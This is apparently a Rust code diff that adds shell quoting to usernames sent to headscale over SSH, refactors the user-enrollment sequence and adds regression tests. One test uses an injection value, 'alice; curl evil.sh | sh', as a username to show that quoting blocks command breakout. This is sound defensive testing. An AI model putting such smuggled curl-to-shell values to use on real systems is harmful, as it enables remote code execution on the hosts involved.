@@ -290,6 +290,18 @@ fn run_headscale_cmd(session: &dyn SshSession, args: &str) -> Result<String> {
     Ok(strip_ssh_banner(&out.stdout_str()).to_string())
 }
 
+/// A value interpolated into a remote command line, quoted for the login shell
+/// that will parse it ([`SshSession::run`]).
+///
+/// `validate_username` guards the names auberge is *given*, and cannot guard
+/// the ones it is *told*: a name reaching `remove-user` through the picker
+/// comes from headscale's own store, where an OIDC claim or `users rename` can
+/// put anything. The guard was applied on one of the two paths, so the picker
+/// handed an unchecked string to a `sudo` command line.
+fn quote(value: &str) -> String {
+    shell_escape::escape(value.into()).into_owned()
+}
+
 /// A headscale list, which is `null` rather than `[]` when it is empty:
 /// `printListOutput` hands `encoding/json` a nil Go slice, and a nil slice
 /// marshals to `null`. Both listings go through here so only one of them can
@@ -301,7 +313,10 @@ fn parse_list<T: serde::de::DeserializeOwned>(raw: &str, what: &str) -> Result<V
 }
 
 fn create_user(session: &dyn SshSession, username: &str) -> Result<HeadscaleUser> {
-    let raw = run_headscale_cmd(session, &format!("users create {} -o json", username))?;
+    let raw = run_headscale_cmd(
+        session,
+        &format!("users create {} -o json", quote(username)),
+    )?;
     serde_json::from_str(raw.trim()).wrap_err("Failed to parse headscale users create response")
 }
 
@@ -346,9 +361,31 @@ fn list_nodes(session: &dyn SshSession) -> Result<Vec<HeadscaleNode>> {
 fn destroy_user(session: &dyn SshSession, username: &str) -> Result<()> {
     run_headscale_cmd(
         session,
-        &format!("users destroy --name {} --force", username),
+        &format!("users destroy --name {} --force", quote(username)),
     )?;
     Ok(())
+}
+
+/// The whole enrollment mutation, as the one remote sequence it is.
+///
+/// The step that broke was not either call but the value threaded *between*
+/// them, so the threading is what has to be reachable from a test: the entry
+/// point below builds its own `LiveSshSession` and can never be one (ADR-0047).
+/// `mint_preauth_key`'s `u64` already makes the original regression a type
+/// error; this makes it a test failure as well, including for a future
+/// signature that stopped being a `u64`.
+fn add_user(
+    session: &dyn SshSession,
+    username: &str,
+    expiration: &str,
+) -> Result<(HeadscaleUser, String)> {
+    output::info(&format!("Creating user '{}'...", username));
+    let user = create_user(session, username)?;
+    output::success(&format!("User '{}' created (id {})", user.name, user.id));
+
+    output::info("Generating pre-auth key...");
+    let key = mint_preauth_key(session, user.id, expiration)?;
+    Ok((user, key))
 }
 
 pub fn run_headscale_add_user(
@@ -386,12 +423,7 @@ pub fn run_headscale_add_user(
     validate_username(&username)?;
     validate_expiration(&exp)?;
 
-    output::info(&format!("Creating user '{}'...", username));
-    let user = create_user(&session, &username)?;
-    output::success(&format!("User '{}' created (id {})", user.name, user.id));
-
-    output::info("Generating pre-auth key...");
-    let key = mint_preauth_key(&session, user.id, &exp)?;
+    let (_user, key) = add_user(&session, &username, &exp)?;
 
     let config = Config::load()?;
     let subdomain = config
@@ -699,21 +731,19 @@ mod tests {
         assert!(list_nodes(&mock).unwrap().is_empty());
     }
 
-    /// The bug this file was rewritten for: the key is minted against the id
-    /// the create response carried, and the username appears nowhere in the
-    /// `preauthkeys` command line.
+    /// The bug this file was rewritten for, asserted through the sequence that
+    /// held it: the id the create response carried is what reaches
+    /// `preauthkeys create`, and the username appears nowhere in that command
+    /// line.
     #[test]
     fn add_user_mints_the_key_against_the_new_users_id() {
         let mock = MockSshSession::new();
         mock.stage_run_result(CommandResult::from_stdout(USER_CREATED_JSON));
         mock.stage_run_result(CommandResult::from_stdout(PREAUTHKEY_JSON));
 
-        let user = create_user(&mock, "sripwoud").unwrap();
+        let (user, key) = add_user(&mock, "sripwoud", "24h").unwrap();
         assert_eq!(user.id, 7);
-        assert_eq!(
-            mint_preauth_key(&mock, user.id, "24h").unwrap(),
-            "abcdef123456"
-        );
+        assert_eq!(key, "abcdef123456");
 
         assert_eq!(
             mock.calls(),
@@ -725,6 +755,29 @@ mod tests {
                 ),
             ]
         );
+    }
+
+    /// A name auberge never validated — the picker takes it from headscale's
+    /// own store — reaches a `sudo` command line, so it is quoted there.
+    #[test]
+    fn a_username_from_the_picker_cannot_break_out_of_the_command_line() {
+        let mock = MockSshSession::new();
+        destroy_user(&mock, "alice; curl evil.sh | sh").unwrap();
+        assert_eq!(
+            mock.calls(),
+            vec![SshOp::Run(
+                "sudo headscale users destroy --name \'alice; curl evil.sh | sh\' --force"
+                    .to_string()
+            )]
+        );
+    }
+
+    /// Quoting is not allowed to change the ordinary case, which every other
+    /// command-line assertion in this module is written against.
+    #[test]
+    fn quoting_leaves_an_ordinary_username_untouched() {
+        assert_eq!(quote("alice"), "alice");
+        assert_eq!(quote("bob-123_x"), "bob-123_x");
     }
 
     /// `--user` is a `uint` on 0.29.3, so a username there is a value cobra
